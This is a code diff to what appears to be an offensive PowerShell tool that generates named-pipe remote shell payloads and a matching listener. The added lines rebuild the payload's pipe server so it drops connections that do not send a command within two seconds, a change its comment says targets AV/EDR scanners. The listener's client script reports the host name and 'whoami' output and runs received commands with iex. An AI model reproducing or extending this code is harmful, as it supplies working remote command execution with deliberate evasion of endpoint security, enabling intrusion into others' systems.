@@ -201,23 +201,27 @@ function New-PayloadScript {
             "`$$vPipe.Close();`$$vPipe.Dispose()"
         )
     } else {
+        # phantom-rejection loop: recreate pipe each iteration, drop connections that don't
+        # send a first command within 2s (AV/EDR scanners). $vCb signals first line is pre-read.
         $pipeSetup = (
             "`$$vSec=New-Object System.IO.Pipes.PipeSecurity;" +
             "`$$vSid=New-Object System.Security.Principal.SecurityIdentifier '$SID';" +
             "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
             "`$$vSec.AddAccessRule(`$$vAr);" +
             "`$$vT=$serverType;" +
-            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
-            "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
-            "`$$vPipe.WaitForConnection();" +
-            "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
+            "while(`$true){" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',-1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
             "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
-            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe)"
+            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
+            "`$$vPipe.WaitForConnection();" +
+            "try{`$$vTm=`$$vRd.ReadLineAsync();if(`$$vTm.Wait(2000)-and`$null-ne`$$vTm.Result){`$$vCmd=`$$vTm.Result;break}}catch{};" +
+            "`$$vPipe.Dispose()}"
         )
         $loop = (
+            "`$$vCb=`$true;" +
             "while(`$true){if(-not `$$vPipe.IsConnected){break};" +
-            "`$$vCmd=`$$vRd.ReadLine();" +
-            "if(`$$vCmd -eq 'exit'){break};" +
+            "if(`$$vCb){`$$vCb=`$false}else{`$$vCmd=`$$vRd.ReadLine()};" +
+            "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
             "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
@@ -2863,7 +2867,7 @@ function Start-Listener {
 		$PipeName = $randomvalue -join ""
 	} else {$PipeName = $SinglePipeName}
 	
-	$ComputerName = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+	$ComputerName = if ($global:IP) { $global:IP } else { [System.Net.Dns]::GetHostByName(($env:computerName)).HostName }
 
 	$ClientScript="`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('$($global:EndMarker)');`$w.Flush()}`$p.Close();`$p.Dispose()"
 	
